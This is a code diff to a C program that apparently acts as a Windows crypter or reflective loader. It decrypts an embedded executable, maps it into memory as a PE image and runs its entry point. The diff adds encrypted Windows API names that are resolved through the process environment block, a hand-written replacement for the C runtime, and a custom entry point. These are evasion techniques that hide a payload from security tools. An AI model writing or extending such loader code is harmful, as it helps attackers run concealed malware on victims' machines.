@@ -1,8 +1,5 @@
 #include <windows.h>
 #include <winternl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 
 // The variables and prototypes necessary for decryption
 
@@ -42,64 +39,68 @@ struct in_memory_pe{
 
 PPEB peb_windows_structure = NULL;
 void *kernel_library_address = NULL;
-int number_kernel_library_functions = 8;
-void *kernel_library_function_addresses[8] = {};
+int number_kernel_library_functions = 11;
+void *kernel_library_function_addresses[11] = {};
 char encrypted_kernel_library_name[] = "\xd9\xdd\x49\x22\x1b\xbf\x83\xe1\x42\xab\xa7\x71\xb5\xb0\x03\xe3\xc4\xb8\xfe\x61\x9f\x19\xea\xa6\x79\x85\x0a\xee\xad\xd8\x65\x28\x69\x0f\xcd\x31\x48\xfb\x95\xb2\x86\xb1\xd9\x84\x60\xa6\xc9\xe6";
 int size_encrypted_kernel_library_name = 48;
 const wchar_t *kernel_library_name = NULL;
-// expected order is GetProcAddress, LoadLibraryA, GetModuleHandleA, VirtualAlloc, VirtualProctect
-char encrypted_kernel_library_function_names[] = "\xfe\xb6\x6b\xfe\xab\x1a\xe5\xd6\x8c\xb5\xeb\x1f\x67\xf3\x5d\xaa\x4c\xbe\xc6\xfc\x60\xbf\x9e\xac\x5a\xe7\xc5\x0b\xd8\x38\xad\xab\xa2\xd7\xd8\x5c\x40\xfd\xec\xae\x6a\xf0\x75\x18\x69\x9a\x36\x3e\x92\xd2\xea\x4c\x1d\xa4\x48\x3a\xaa\x08\xf7\xa2\x00\xe4\x1e\x0f\xae\xce\x95\xfa\x47\x53\xe1\x93\x18\x45\x4e\x40\x76\x92\x5d\x51\x12\x2c\xc5\xd1\x29\x9f\xa8\xd5\xa7\x29\x71\xe3\x40\x2a\x1d\xd9\xcd\x64\x50\x55\x62\x7e\x31\xc6\x32\x64\xee\xbe\xf8\x5a\xea\xac\x78\x0c\x09\x35\x15\x9b\x94\xbe\xed\xc8\x36\x84\x23\x53\x32\x88";
-int size_encrypted_kernel_library_function_names = 128;
+// expected order is 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree'.encode('ascii') + b'\x00'
+char encrypted_kernel_library_function_names[] = "\xa0\x96\x48\xdc\xc3\x48\x76\x39\x35\xc3\x72\x08\xc5\xd2\x0f\x34\xc6\x7d\x46\x6d\x7a\xb7\x02\x14\xac\xe8\xf0\x49\xad\x21\x90\x29\xa6\xa3\x20\xbe\x65\xae\xe0\x68\x2a\x2f\x1b\x53\x04\x3c\x28\x1c\x62\x38\xf8\xcf\xdd\x81\xd7\x7b\x07\xb6\xc3\x5b\xd4\x6b\x22\x22\xfd\x3a\x15\x4d\xbe\x65\x6b\x36\xbe\x6d\xb9\x06\xd4\xf9\x5c\xd7\xcf\x3e\xa2\xa2\x9d\x16\xc1\x8b\xd0\xc8\xd7\x31\x95\x52\x4e\x93\x12\x45\xcb\x78\x94\x56\x0b\x17\xb0\x24\x29\x79\x88\x4e\x6c\xe7\x8e\x73\x63\x22\xde\xe3\x0c\x3e\x38\x93\x08\xfe\xf1\xb8\x78\x93\x04\xe0\x6f\x7e\x4d\x85\xa1\x27\x79\x14\xa2\x39\x47\xa0\x66\xda\xff\xf1\xee\x41\x70\x1f\xc1\x76\x6c\x4b\x3b\x63\x78\x1e\x3e\xe2";
+int size_encrypted_kernel_library_function_names = 160;
 const char *kernel_library_function_names = NULL;
 
 // Variables for the C standard library
 
-// static HANDLE global_windows_heap = NULL;
+static HANDLE global_windows_heap = NULL;
 
 // START C STANDARD LIBRARY REPLACEMENT
 
 // strcmp - compare strings
-//int strcmp(const char *s1, const char *s2) {
-//    while (*s1 && (*s1 == *s2)) {
-//        s1++;
-//        s2++;
-//    }
-//    return (unsigned char)*s1 - (unsigned char)*s2;
-//}
+int strcmp(const char *s1, const char *s2) {
+    while (*s1 && (*s1 == *s2)) {
+        s1++;
+        s2++;
+    }
+    return (unsigned char)*s1 - (unsigned char)*s2;
+}
 
 // memcpy - copy memory
-//void *memcpy(void *dest, const void *src, size_t n) {
-//    unsigned char *d = (unsigned char *)dest;
-//    const unsigned char *s = (const unsigned char *)src;
-//    while (n--) {
-//        *d++ = *s++;
-//    }
-//    return dest;
-//}
+void *memcpy(void *dest, const void *src, size_t n) {
+    unsigned char *d = (unsigned char *)dest;
+    const unsigned char *s = (const unsigned char *)src;
+    while (n--) {
+        *d++ = *s++;
+    }
+    return dest;
+}
 
 // memset - set memory
-//void *memset(void *s, int c, size_t n) {
-//    unsigned char *p = (unsigned char *)s;
-//    while (n--) {
-//        *p++ = (unsigned char)c;
-//    }
-//    return s;
-//}
+void *memset(void *s, int c, size_t n) {
+    unsigned char *p = (unsigned char *)s;
+    while (n--) {
+        *p++ = (unsigned char)c;
+    }
+    return s;
+}
 
-// malloc - allocate memory
-//void *malloc(size_t allocation_size) {
-//    if (!global_windows_heap) {
-//        global_windows_heap = ((HANDLE (__stdcall *)(void)) kernel_library_function_addresses[7])();
-//    }
-//    return ((LPVOID (__stdcall *)(HANDLE, DWORD, SIZE_T)) kernel_library_function_addresses[6])(global_windows_heap, 0, allocation_size);
-//}
 
-// free - deallocate memory
-//void free(void *pointer_to_free) {
-//    if (pointer_to_free && global_windows_heap) {
-//        ((BOOL (__stdcall *)(HANDLE, DWORD, LPVOID)) kernel_library_function_addresses[5])(global_windows_heap, 0, pointer_to_free);
-//    }
-//}
+void *malloc(size_t size) {
+    return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+}
+
+void free(void *ptr) {
+    if (ptr) {
+        ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[10])(ptr, 0, MEM_RELEASE);
+    }
+}
+
+
+void print_minimal(void) {
+    const char *msg = "Hello from minimal printf\n";
+    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
+    DWORD written;
+    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
+}
 
 // #include "executable.h"
 //
@@ -393,7 +394,7 @@ int set_protections(in_memory_pe *new_pe){
 }
 
 in_memory_pe *code_handling_load_pe(const char *pe_data, DWORD size){
-    in_memory_pe *new_pe = malloc(size);
+    in_memory_pe *new_pe = malloc(sizeof(in_memory_pe));
     if(new_pe == NULL)
         goto error;
     
@@ -424,19 +425,16 @@ error:
 }
 
 void code_handling_execute(in_memory_pe *new_pe){
-    printf("got here\n");
     void (*execute_entry_point)(void) = (void(*)()) new_pe->entry_point;
     execute_entry_point();
 }
 
 // MAIN
-//void __main(void) {
-//    // Empty - initialization if needed
-//}
 
-int main(void) {    
+int __start(void) {   
     init_kernel_library();
-     
+    print_minimal();
+
     decrypt_data(executable_pe, executable_size);
 
     DWORD new_size = executable_size - (DWORD) iv_length - (DWORD) executable_pe[executable_size - 1];
